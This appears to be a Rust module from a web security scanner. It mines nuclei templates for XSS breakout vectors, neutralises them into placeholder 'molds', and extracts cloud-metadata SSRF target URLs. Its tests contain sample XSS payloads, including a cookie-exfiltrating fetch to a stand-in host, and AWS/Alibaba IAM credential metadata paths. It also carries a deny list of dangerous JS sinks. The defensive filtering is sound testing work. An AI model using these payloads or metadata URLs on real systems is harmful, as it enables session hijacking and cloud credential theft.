// SPDX-License-Identifier: LicenseRef-Propietario
//! nuclei como PROVEEDOR DE FÓRMULAS — la inversión. En vez de que nuclei ATAQUE con su
//! oráculo por-string (la causa del FP #11), sus vectores XSS ejecutables se leen como
//! MOLDES: se les sustituye la llamada `alert(...)`/`prompt(...)`/`confirm(...)` por un
//! placeholder de NUESTRO JS de prueba, CONSERVANDO el breakout —que es su valor: casos,
//! tags exóticos (`<details ontoggle>`, `<marquee onstart>`), tricks de cierre de tag—, y
//! `xss::transcribir_xss` lo rellena con `canary_js(nonce)` y confirma por EJECUCIÓN en
//! Chromium. nuclei deja de ser el atacante y pasa a ser la fuente de fórmulas; arnm ataca.
//!
//! Extracción DIRIGIDA, sin parser YAML (dir. 26: sin deps nuevas). Opera sobre DATOS, no
//! código: saca cadenas entrecomilladas con forma de vector. Best-effort — un molde de más
//! no hace daño (el oráculo de ejecución lo descarta), uno de menos tampoco (quedan los 6
//! vectores a mano). El molde nace nonce-independiente (lleva el placeholder), se carga una
//! vez por fase.

use std::path::Path;

/// El marcador que `xss::transcribir_xss` sustituye por `browser::canary_js(nonce).0`.
pub const PLACEHOLDER_JS: &str = "__NXJS__";

/// ¿La cadena tiene forma de vector XSS EJECUTABLE? Debe tener un sink de evento o `<script>`
/// Y una llamada (alert/prompt/confirm) que sustituir por nuestro JS. Puro.
pub fn es_vector_ejecutable(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    let ejecuta = [
        "onerror=", "onload=", "ontoggle=", "onmouseover=", "onfocus=", "onstart=",
        "onanimationstart=", "onpointerover=", "onbegin=", "<script",
    ]
    .iter()
    .any(|m| l.contains(m));
    let llamada = l.contains("alert(") || l.contains("prompt(") || l.contains("confirm(");
    ejecuta && llamada
}

/// ¿Queda en el molde (ya con placeholder) algún sink EJECUTABLE que NO sea nuestra prueba?
/// (`fetch`, `document.cookie`, redirección, `eval`, temporizadores, `function(`…). Puro. Es
/// lo que hace la inertidad una garantía del CÓDIGO y no del corpus (revisión de seguridad O1).
fn contiene_sink_peligroso(molde: &str) -> bool {
    let l = molde.to_ascii_lowercase();
    [
        "fetch(", "xmlhttprequest", "document.cookie", "document.location", "location=",
        "location.href", "location.replace", "eval(", "settimeout(", "setinterval(",
        "function(", "import(", ".src=", ".innerhtml", ".outerhtml", "navigator.send",
        "new image", "window.open", "document.write",
    ]
    .iter()
    .any(|s| l.contains(s))
}

/// Sustituye TODAS las llamadas `alert/prompt/confirm(...)` por el placeholder (paréntesis
/// BALANCEADO, no regex sobre código), y RECHAZA el molde si tras la sustitución queda algún
/// sink ejecutable distinto de nuestra prueba. `None` si no había ninguna llamada, si un
/// paréntesis queda sin cerrar, o si el resto no es inerte. Así un payload que colara un
/// `fetch(document.cookie)` junto al `alert` no se convierte en molde (estatuto: PoC inerte).
pub fn a_molde(payload: &str) -> Option<String> {
    let mut actual = payload.to_string();
    let mut sustituciones = 0usize;
    loop {
        let low = actual.to_ascii_lowercase();
        let inicio = ["alert(", "prompt(", "confirm("]
            .iter()
            .filter_map(|n| low.find(n))
            .min();
        let Some(inicio) = inicio else { break };
        let bytes = actual.as_bytes();
        let abre = inicio + actual[inicio..].find('(')?;
        let mut i = abre + 1;
        let mut prof = 1i32;
        while i < bytes.len() && prof > 0 {
            match bytes[i] {
                b'(' => prof += 1,
                b')' => prof -= 1,
                _ => {}
            }
            i += 1;
        }
        if prof != 0 {
            return None; // paréntesis sin cerrar: no es un vector limpio
        }
        let mut out = String::with_capacity(actual.len());
        out.push_str(&actual[..inicio]);
        out.push_str(PLACEHOLDER_JS);
        out.push_str(&actual[i..]);
        actual = out;
        sustituciones += 1;
    }
    if sustituciones == 0 || contiene_sink_peligroso(&actual) {
        return None;
    }
    Some(actual)
}

/// Extrae los MOLDES XSS (con placeholder) del contenido de un template: cadenas
/// entrecomilladas (`"` o `'`) con forma de vector, pasadas a molde, deduplicadas. Puro.
pub fn extraer_moldes(contenido: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for delim in ['"', '\''] {
        let mut resto = contenido;
        while let Some(a) = resto.find(delim) {
            let tras = &resto[a + 1..];
            let Some(b) = tras.find(delim) else { break };
            let cand = &tras[..b];
            if es_vector_ejecutable(cand) {
                if let Some(m) = a_molde(cand) {
                    if !out.contains(&m) {
                        out.push(m);
                    }
                }
            }
            resto = &tras[b + 1..];
        }
    }
    out
}

/// ¿Vale la pena LEER este archivo? Solo los `.yaml` cuya ruta sugiere XSS/dast/script — así
/// no se leen los ~13k templates de CVE para nada (el payload XSS no está ahí). Puro.
fn archivo_relevante(ruta: &Path) -> bool {
    if ruta.extension().and_then(|x| x.to_str()) != Some("yaml") {
        return false;
    }
    let s = ruta.to_string_lossy().to_ascii_lowercase();
    s.contains("xss") || s.contains("/dast") || s.contains("script")
}

/// Carga los moldes XSS de los templates bajo `dir` (recursivo, solo archivos relevantes),
/// dedup y CAP (el oráculo es caro —Chromium por variante—; la diversidad se satura pronto).
/// `tope=0` = sin cap. Devuelve vacío si el dir no existe (falla suave: quedan los 6 a mano).
pub fn cargar_moldes_xss(dir: &Path, tope: usize) -> Vec<String> {
    // Tope de PROFUNDIDAD: corta un ciclo de symlinks (un enlace-a-directorio que apunte hacia
    // arriba daría un recorrido infinito). nuclei-templates tiene ~6 niveles (revisión O2).
    const MAX_PROF: usize = 15;
    let mut moldes: Vec<String> = Vec::new();
    let mut pila: Vec<(std::path::PathBuf, usize)> = vec![(dir.to_path_buf(), 0)];
    while let Some((d, prof)) = pila.pop() {
        if prof > MAX_PROF {
            continue;
        }
        let Ok(rd) = std::fs::read_dir(&d) else { continue };
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() {
                pila.push((p, prof + 1));
            } else if archivo_relevante(&p) {
                if let Ok(c) = std::fs::read_to_string(&p) {
                    for m in extraer_moldes(&c) {
                        if !moldes.contains(&m) {
                            moldes.push(m);
                            if tope > 0 && moldes.len() >= tope {
                                return moldes;
                            }
                        }
                    }
                }
            }
        }
    }
    moldes
}

// ===================== La inversión para SSRF a metadata =====================
//
// El análogo de un molde XSS aquí es un OBJETIVO de metadata: una IP de metadata de
// nube y la RUTA a leer. nuclei ha curado, en sus templates de SSRF/cloud, muchas
// más rutas y proveedores (Alibaba 100.100.100.200, Oracle 192.0.0.192, rutas AWS
// exóticas…) que las 6 de fondo hand-crafted. No hay placeholder: el objetivo ES el
// endpoint —arnm inyecta la URL entera como valor de parámetro— y el oráculo de
// exfiltración (`ssrf::detectar_metadata_exfiltrada`) confirma por CONTENIDO, no por
// string. Best-effort sobre DATOS, sin parser YAML (dir. 26).

use std::net::Ipv4Addr;

/// Las IPs de metadata que reconocemos como destino SSRF válido. `metadata.google.
/// internal` (nombre, no IP) ya lo cubre el objetivo GCP base; aquí solo IPs, porque
/// las familias de mutación de arnm operan sobre `Ipv4Addr`.
const IPS_METADATA: &[&str] = &[
    "169.254.169.254", // AWS / Azure / GCP / DigitalOcean (link-local compartida)
    "100.100.100.200", // Alibaba Cloud
    "192.0.0.192",     // Oracle Cloud (OCI)
    "169.254.170.2",   // AWS ECS task metadata
];

/// Si `s` es una URL `http(s)://<ip-metadata><ruta>` GET-safe, devuelve `(ip, ruta)`.
/// Rechaza hostnames, IPs que no son de metadata, y lo que no tenga ruta. Puro.
pub fn url_a_objetivo(s: &str) -> Option<(Ipv4Addr, String)> {
    let resto = s
        .trim()
        .strip_prefix("http://")
        .or_else(|| s.trim().strip_prefix("https://"))?;
    let corte = resto.find(['/', '?']).unwrap_or(resto.len());
    let host = resto[..corte].split(':').next().unwrap_or(&resto[..corte]);
    if !IPS_METADATA.contains(&host) {
        return None;
    }
    let ip: Ipv4Addr = host.parse().ok()?;
    let cruda = &resto[corte..];
    if !cruda.starts_with('/') {
        return None; // solo host, sin ruta: no es un objetivo útil
    }
    // Corta en el primer carácter que no puede ir en una URL de plantilla limpia
    // (espacio, comilla, backtick) o en un placeholder de nuclei (`{{...}}`).
    let ruta: String = cruda
        .split(|c: char| c.is_whitespace() || c == '"' || c == '\'' || c == '`' || c == '{')
        .next()
        .unwrap_or(cruda)
        .to_string();
    Some((ip, ruta))
}

/// Extrae los OBJETIVOS de metadata (ip, ruta) de las cadenas entrecomilladas de un
/// template, deduplicados. Puro.
pub fn extraer_objetivos_metadata(contenido: &str) -> Vec<(Ipv4Addr, String)> {
    let mut out: Vec<(Ipv4Addr, String)> = Vec::new();
    for delim in ['"', '\''] {
        let mut resto = contenido;
        while let Some(a) = resto.find(delim) {
            let tras = &resto[a + 1..];
            let Some(b) = tras.find(delim) else { break };
            if let Some(obj) = url_a_objetivo(&tras[..b]) {
                if !out.contains(&obj) {
                    out.push(obj);
                }
            }
            resto = &tras[b + 1..];
        }
    }
    out
}

/// ¿Vale la pena leer este archivo para objetivos SSRF? Solo `.yaml` cuya ruta
/// sugiere ssrf/metadata/cloud/dast — así no se leen los ~13k templates para nada.
fn archivo_relevante_ssrf(ruta: &Path) -> bool {
    if ruta.extension().and_then(|x| x.to_str()) != Some("yaml") {
        return false;
    }
    let s = ruta.to_string_lossy().to_ascii_lowercase();
    s.contains("ssrf") || s.contains("metadata") || s.contains("cloud") || s.contains("/dast")
}

/// Carga objetivos de metadata de los templates bajo `dir` (recursivo, solo
/// relevantes), dedup y CAP. `tope=0` = sin cap. Falla suave (dir ausente → vacío:
/// queda el catálogo base multi-nube de arnm). Mismo recorrido que `cargar_moldes_xss`.
pub fn cargar_objetivos_metadata(dir: &Path, tope: usize) -> Vec<(Ipv4Addr, String)> {
    const MAX_PROF: usize = 15;
    let mut objetivos: Vec<(Ipv4Addr, String)> = Vec::new();
    let mut pila: Vec<(std::path::PathBuf, usize)> = vec![(dir.to_path_buf(), 0)];
    while let Some((d, prof)) = pila.pop() {
        if prof > MAX_PROF {
            continue;
        }
        let Ok(rd) = std::fs::read_dir(&d) else { continue };
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() {
                pila.push((p, prof + 1));
            } else if archivo_relevante_ssrf(&p) {
                if let Ok(c) = std::fs::read_to_string(&p) {
                    for obj in extraer_objetivos_metadata(&c) {
                        if !objetivos.contains(&obj) {
                            objetivos.push(obj);
                            if tope > 0 && objetivos.len() >= tope {
                                return objetivos;
                            }
                        }
                    }
                }
            }
        }
    }
    objetivos
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_molde_sustituye_la_llamada_conserva_el_breakout() {
        // Vector de nuclei → molde con placeholder, breakout intacto.
        assert_eq!(
            a_molde("</script><svg/onload=alert(document.domain)>").unwrap(),
            "</script><svg/onload=__NXJS__>"
        );
        assert_eq!(
            a_molde("<img src=x onerror=alert(1)>").unwrap(),
            "<img src=x onerror=__NXJS__>"
        );
        // Paréntesis anidado (balanceo): alert(String.fromCharCode(88)).
        assert_eq!(
            a_molde("<body onload=alert(String.fromCharCode(88))>").unwrap(),
            "<body onload=__NXJS__>"
        );
        // Sin llamada → None (nada que transcribir).
        assert!(a_molde("<b>hola</b>").is_none());
        // INERTIDAD (revisión O1): TODAS las llamadas se neutralizan (dos alert → dos placeholder).
        assert_eq!(
            a_molde("<svg onload=alert(1)><img onerror=alert(2)>").unwrap(),
            "<svg onload=__NXJS__><img onerror=__NXJS__>"
        );
        // ROJO: un payload que cuela un sink ejecutable junto al alert → RECHAZADO (no es PoC inerte).
        assert!(a_molde("<script>fetch('//x'+document.cookie);alert(1)</script>").is_none());
        assert!(a_molde("<svg onload=alert(1)><script>document.location='//evil'</script>").is_none());
        assert!(a_molde("<img onerror=eval(atob('x'))>alert(1)").is_none()); // sin alert-vector real + eval
    }

    #[test]
    fn es_vector_discrimina() {
        // VERDE: vectores ejecutables reales de nuclei.
        assert!(es_vector_ejecutable("</script><img src onerror=alert(document.domain)>"));
        assert!(es_vector_ejecutable("<svg/onload=alert(/XSS/)>"));
        assert!(es_vector_ejecutable("<ScRipT>alert(1)</ScRipT>"));
        // ROJO (pareja, dir. 33): reflexión sin ejecución (el marcador débil de nuclei),
        // texto plano, y un evento SIN llamada que sustituir.
        assert!(!es_vector_ejecutable("'\"><12345>")); // marcador de reflexión, no ejecuta
        assert!(!es_vector_ejecutable("cualquier texto"));
        assert!(!es_vector_ejecutable("<img src=x>")); // sin onerror ni alert
        assert!(!es_vector_ejecutable("onerror=foo")); // evento pero sin alert/prompt/confirm
    }

    #[test]
    fn url_a_objetivo_discrimina_metadata() {
        // VERDE: URLs de metadata reales → (ip, ruta), incluidos Alibaba y Oracle.
        assert_eq!(
            url_a_objetivo("http://169.254.169.254/latest/meta-data/hostname"),
            Some((Ipv4Addr::new(169, 254, 169, 254), "/latest/meta-data/hostname".to_string()))
        );
        assert_eq!(
            url_a_objetivo("http://100.100.100.200/latest/meta-data/"),
            Some((Ipv4Addr::new(100, 100, 100, 200), "/latest/meta-data/".to_string()))
        );
        assert_eq!(
            url_a_objetivo("http://192.0.0.192/opc/v2/identity/"),
            Some((Ipv4Addr::new(192, 0, 0, 192), "/opc/v2/identity/".to_string()))
        );
        // ROJO (dir. 33): host que NO es de metadata, hostname, y URL sin ruta.
        assert!(url_a_objetivo("http://example.com/latest/meta-data/").is_none());
        assert!(url_a_objetivo("http://metadata.google.internal/computeMetadata/v1/").is_none());
        assert!(url_a_objetivo("http://169.254.169.254").is_none()); // sin ruta
        assert!(url_a_objetivo("no soy una url").is_none());
        // Corta el placeholder de nuclei y las comillas.
        assert_eq!(
            url_a_objetivo("http://169.254.169.254/latest/{{path}}").map(|(_, r)| r),
            Some("/latest/".to_string())
        );
    }

    #[test]
    fn extraer_objetivos_de_un_template_ssrf() {
        let yaml = r#"
        info:
          name: Cloud metadata SSRF
        http:
          - payloads:
              url:
                - "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
                - "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
                - "https://example.com/ruido"
        "#;
        let o = extraer_objetivos_metadata(yaml);
        assert!(o.iter().any(|(ip, _)| *ip == Ipv4Addr::new(169, 254, 169, 254)));
        assert!(o.iter().any(|(ip, _)| *ip == Ipv4Addr::new(100, 100, 100, 200)), "Alibaba extraído");
        // El host de ruido NO es un objetivo de metadata.
        assert!(!o.iter().any(|(_, r)| r.contains("ruido")));
    }

    #[test]
    fn extraer_saca_los_vectores_de_un_template() {
        // Un fragmento de template con dos vectores y ruido alrededor.
        let yaml = r#"
        info:
          name: XSS
        http:
          - payloads:
              x:
                - "</script><svg/onload=alert(document.domain)>"
                - '<img src=x onerror=prompt(1)>'
                - "'\"><99999>"
        "#;
        let m = extraer_moldes(yaml);
        assert!(m.contains(&"</script><svg/onload=__NXJS__>".to_string()));
        assert!(m.contains(&"<img src=x onerror=__NXJS__>".to_string()));
        // El marcador de reflexión NO es un molde ejecutable.
        assert!(!m.iter().any(|s| s.contains("99999")));
    }
}
